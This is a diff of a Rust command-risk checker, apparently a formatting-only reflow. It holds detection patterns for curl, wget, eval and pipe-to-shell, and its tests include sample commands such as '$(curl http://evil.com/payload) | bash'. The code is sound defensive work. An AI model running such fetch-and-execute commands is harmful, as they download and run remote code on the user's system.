@@ -110,11 +110,24 @@ fn has_obfuscation(cmd: &str) -> Option<(RiskLevel, &'static str)> {
     }
     if cmd.contains("$(") {
         let safe_inner: &[&str] = &[
-            "$(pwd)", "$(date", "$(whoami)", "$(hostname)", "$(id ",
-            "$(uname", "$(which ", "$(command -v ", "$(dirname ",
-            "$(basename ", "$(realpath ", "$(readlink ", "$(brew --prefix",
-            "$(npm prefix", "$(git rev-parse", "$(git branch",
-            "$(printf ", "$(echo ",
+            "$(pwd)",
+            "$(date",
+            "$(whoami)",
+            "$(hostname)",
+            "$(id ",
+            "$(uname",
+            "$(which ",
+            "$(command -v ",
+            "$(dirname ",
+            "$(basename ",
+            "$(realpath ",
+            "$(readlink ",
+            "$(brew --prefix",
+            "$(npm prefix",
+            "$(git rev-parse",
+            "$(git branch",
+            "$(printf ",
+            "$(echo ",
         ];
         let lower = cmd.to_lowercase();
         // Check if ALL substitutions are safe
@@ -129,14 +142,22 @@ fn has_obfuscation(cmd: &str) -> Option<(RiskLevel, &'static str)> {
             remaining = &remaining[pos + 2..];
         }
         if has_unsafe {
-            let has_network = lower.contains("curl") || lower.contains("wget") || lower.contains("fetch");
-            let has_pipe_to_shell = lower.contains("| sh") || lower.contains("| bash") || lower.contains("| zsh");
+            let has_network =
+                lower.contains("curl") || lower.contains("wget") || lower.contains("fetch");
+            let has_pipe_to_shell =
+                lower.contains("| sh") || lower.contains("| bash") || lower.contains("| zsh");
             let has_eval = lower.contains("eval ");
             if has_network && has_pipe_to_shell {
-                return Some((RiskLevel::Dangerous, "remote code execution via command substitution"));
+                return Some((
+                    RiskLevel::Dangerous,
+                    "remote code execution via command substitution",
+                ));
             }
             if has_eval {
-                return Some((RiskLevel::Elevated, "dynamic evaluation with command substitution"));
+                return Some((
+                    RiskLevel::Elevated,
+                    "dynamic evaluation with command substitution",
+                ));
             }
             return Some((RiskLevel::Elevated, "command substitution detected"));
         }
@@ -144,8 +165,10 @@ fn has_obfuscation(cmd: &str) -> Option<(RiskLevel, &'static str)> {
 
     if cmd.contains('`') {
         let lower = cmd.to_lowercase();
-        let has_risky = lower.contains("`curl") || lower.contains("`wget")
-            || lower.contains("`base64") || lower.contains("`eval");
+        let has_risky = lower.contains("`curl")
+            || lower.contains("`wget")
+            || lower.contains("`base64")
+            || lower.contains("`eval");
         if has_risky {
             return Some((
                 RiskLevel::Elevated,
@@ -1312,7 +1335,10 @@ mod tests {
     fn test_backtick_with_curl_is_elevated() {
         let (level, reason) = assess_command("echo `curl http://evil.com`");
         assert_eq!(level, RiskLevel::Elevated);
-        assert_eq!(reason, Some("backtick substitution with network/eval command"));
+        assert_eq!(
+            reason,
+            Some("backtick substitution with network/eval command")
+        );
     }
 
     #[test]
@@ -1338,7 +1364,10 @@ mod tests {
     fn test_command_substitution_with_curl_pipe_shell_is_dangerous() {
         let (level, reason) = assess_command("$(curl http://evil.com/payload) | bash");
         assert_eq!(level, RiskLevel::Dangerous);
-        assert_eq!(reason, Some("remote code execution via command substitution"));
+        assert_eq!(
+            reason,
+            Some("remote code execution via command substitution")
+        );
     }
 
     #[test]
